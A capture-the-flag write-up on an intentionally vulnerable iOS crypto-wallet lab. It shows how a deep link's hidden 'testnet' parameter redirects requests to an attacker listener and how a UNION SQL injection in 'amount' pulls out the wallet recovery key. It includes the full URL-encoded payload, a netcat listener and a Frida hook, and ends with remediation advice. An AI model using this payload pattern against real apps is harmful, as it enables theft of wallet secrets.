# MobileHackingLab – FlipCoin: Deep-Link SQL Injection on iOS

**FlipCoin** is an intentionally vulnerable iOS challenge from Mobile Hacking Lab. The application presents itself as a cryptocurrency wallet, but its deep-link transaction flow contains two important weaknesses: an attacker-controlled RPC endpoint and SQL injection in the `amount` parameter.

In this writeup, we will trace the deep link from `Info.plist` into `SceneDelegate`, redirect the wallet's JSON-RPC request to a local listener, inspect the underlying SQLite query with Frida, and use a UNION payload to retrieve the challenge flag.

The techniques below were used only inside the lab environment.

## Exploring the Wallet

The home screen exposes **Receive** and **Send** actions and shows a FlipCoin balance of `0.3654`.

![FlipCoin wallet home screen](./images/manual/flipcoin-lab/01.png)

Tapping **Receive** displays a QR code containing a custom URL:

```text
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=1
```

![Receive screen displaying the transaction QR code](./images/manual/flipcoin-lab/02.png)

The URL has three relevant parts:

- `flipcoin` is the custom scheme registered by the app.
- The host-like portion is the destination wallet address used by the challenge.
- `amount=1` supplies the amount to send.

The address is challenge data rather than a valid Ethereum address, but its role in the application is the same: it becomes the destination supplied to the transaction logic.

## Confirming the Custom URL Scheme

We can inspect the extracted application's `Info.plist` with:

```bash
plutil -p Info.plist
```

The relevant entry is:

```text
"CFBundleURLTypes" => [
  0 => {
    "CFBundleTypeRole" => "Editor"
    "CFBundleURLName" => "com.mobilehackinglab.flipcoinwallet"
    "CFBundleURLSchemes" => [
      0 => "flipcoin"
    ]
  }
]
```

`CFBundleURLSchemes` confirms that URLs beginning with `flipcoin://` can launch the application.

## Finding the Deep-Link Handler

On iOS 13 and later, scene-based applications normally receive incoming URLs through:

```text
scene(_:openURLContexts:)
```

Older applications may instead use `application(_:open:options:)` in `AppDelegate`. Searching for `openURL` in IDA leads us to the modern handler inside `SceneDelegate`.

![Searching for the openURL handler in IDA](./images/manual/flipcoin-lab/03.png)

The Swift symbol is displayed in mangled form:

```text
$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
```

The exact mangled name is less important than the behavior of the function: this is where the app receives and parses the QR code's URL.

## Discovering the Hidden `testnet` Parameter

Following the decompiled code shows that the handler extracts the known `amount` parameter. It also reads a second parameter named `testnet`, which did not appear in the original QR code.

![The amount and testnet parameters in the deep-link handler](./images/manual/flipcoin-lab/04.png)

Nearby code also references the default endpoint:

```text
https://mhl.pages.dev:8545
```

![The default JSON-RPC endpoint referenced by the handler](./images/manual/flipcoin-lab/05.png)

Port `8545` is commonly used by Ethereum-compatible JSON-RPC services. This suggests that `testnet` overrides the server that receives the wallet's request.

We can test that hypothesis by adding our own host to the deep link:

```text
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.1&testnet=192.168.1.2
```

Generate a QR code from this URL and scan it on the test device.

![Generating a QR code containing the modified deep link](./images/manual/flipcoin-lab/06.png)

The first attempt used an amount larger than the wallet's balance, so the app rejected the transaction before sending the request.

![The app rejecting a transaction with insufficient balance](./images/manual/flipcoin-lab/07.png)

After reducing the amount to `0.1` and listening on the supplied host, the app sends an HTTP `POST` request with a JSON-RPC body similar to:

```json
{
  "jsonrpc": "2.0",
  "method": "web3_sha3",
  "params": [
    "0x252B2Fff0d264d946n1004E581bb0a46175DC009",
    "111120a58098a188ff60e0949d3102e9cc38b61701065c72f8aed205e76f245e"
  ],
  "id": 1
}
```

This confirms the first weakness: data in the deep link controls the destination of a server-side-style request made by the application. In the lab, a listener can capture the output that would normally be sent to the configured testnet endpoint.

## Locating the SQLite Database

The next question is where the wallet gets the address and balance included in that request. Each iOS application stores its private data in a sandboxed container, usually under a path like:

```text
/var/mobile/Containers/Data/Application/<APP_UUID>/
```

On the jailbroken test device, we search the application containers for SQLite files:

```bash
find /var/mobile/Containers/Data/Application/ -name "*.sqlite"
```

![Searching the iOS application containers for SQLite databases](./images/manual/flipcoin-lab/08.png)

Two relevant files appear:

```text
Library/Application Support/Flipcoin_Wallet.sqlite
Documents/your_database_name.sqlite
```

IDA references `your_database_name.sqlite` and shows the schema for a `wallet` table, making that file the useful target.

![The wallet database name and table schema visible in IDA](./images/manual/flipcoin-lab/09.png)

We can copy it to the analysis machine over SSH:

```bash
sshpass -p 1 scp -P 2222 \
  root@127.0.0.1:/var/mobile/Containers/Data/Application/<APP_UUID>/Documents/your_database_name.sqlite .
```

Then inspect it with the SQLite CLI:

```sql
sqlite3 your_database_name.sqlite
.tables
SELECT * FROM wallet;
```

![Inspecting the wallet table with sqlite3](./images/manual/flipcoin-lab/10.png)

The table has five columns:

```text
id | address | currency | amount | recovery_key
```

Direct database access reveals that the first row contains a recovery key, but reading the file is only a useful confirmation. The intended challenge path is to retrieve that value through the vulnerable deep link.

## Tracing SQLite Queries with Frida

To see the exact SQL statement constructed by the app, we can hook SQLite's prepare functions in `libsqlite3.dylib`:

```javascript
const functions = [
    "sqlite3_prepare",
    "sqlite3_prepare_v2",
    "sqlite3_prepare_v3",
    "sqlite3_prepare16",
    "sqlite3_prepare16_v2",
    "sqlite3_prepare16_v3"
];

functions.forEach(function (name) {
    const address = Module.findExportByName("libsqlite3.dylib", name);
    if (address === null) return;

    Interceptor.attach(address, {
        onEnter(args) {
            const query = name.includes("16")
                ? args[1].readUtf16String()
                : args[1].readCString();
            console.log(`[${name}] ${query}`);
        }
    });
});
```

When another QR code is scanned, the hook prints:

```sql
SELECT * FROM wallet WHERE amount >0.1 AND currency='flipcoin' LIMIT 1;
```

![Frida revealing the SQL query built from the amount parameter](./images/manual/flipcoin-lab/11.png)

The application concatenates the `amount` value directly into SQL rather than binding it as a parameter. Because the value is not validated as a number, the deep link provides a SQL injection primitive.

## Extracting the Recovery Key with UNION

The vulnerable query expects the `wallet` table's five columns. Our UNION query must therefore return five values as well.

The working payload is:

```sql
0.1 AND id=10 UNION SELECT 1,(SELECT recovery_key FROM wallet WHERE id=1),3,4,5 LIMIT 1;--
```

Inserted into the original query, it produces the equivalent of:

```sql
SELECT * FROM wallet
WHERE amount >0.1 AND id=10
UNION SELECT
    1,
    (SELECT recovery_key FROM wallet WHERE id=1),
    3,
    4,
    5
LIMIT 1;--
AND currency='flipcoin' LIMIT 1;
```

The pieces serve distinct purposes:

- `id=10` makes the legitimate branch return no row.
- `UNION SELECT` supplies one attacker-controlled row with the required five columns.
- The nested query places `recovery_key` in the `address` column.
- `LIMIT 1` keeps the result to a single row.
- `--` comments out the remainder of the original statement.

For a QR code, the `amount` value should be URL-encoded. The complete lab URL is:

```text
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.1%20AND%20id%3D10%20UNION%20SELECT%201%2C%28SELECT%20recovery_key%20FROM%20wallet%20WHERE%20id%3D1%29%2C3%2C4%2C5%20LIMIT%201%3B--&testnet=192.168.1.2
```

With a listener running on the test machine:

```bash
nc -lv 80
```

the app uses the injected row to construct its JSON-RPC request. The first value in `params` is now the recovery key, revealing the flag to our listener.

![The injected recovery key returned in the JSON-RPC request](./images/manual/flipcoin-lab/12.png)

## Root Cause and Remediation

Two design errors make the exploit possible:

1. The app accepts an arbitrary `testnet` destination from an untrusted deep link.
2. It concatenates an untrusted `amount` string into a SQL statement.

The database query should use a bound numeric parameter:

```swift
let sql = "SELECT * FROM wallet WHERE amount > ? AND currency = ? LIMIT 1"
```

The app should parse `amount` as a finite, positive decimal before it reaches the database and reject extra syntax. The RPC destination should not be controlled by a public URL parameter; if test environments are necessary, the app should select them from a fixed allowlist in a development-only build.

This lab demonstrates why custom URL schemes must be treated as untrusted input. A deep link may look like a navigation feature, but once its values reach networking and database code, weak validation can turn it into a complete data-extraction path.
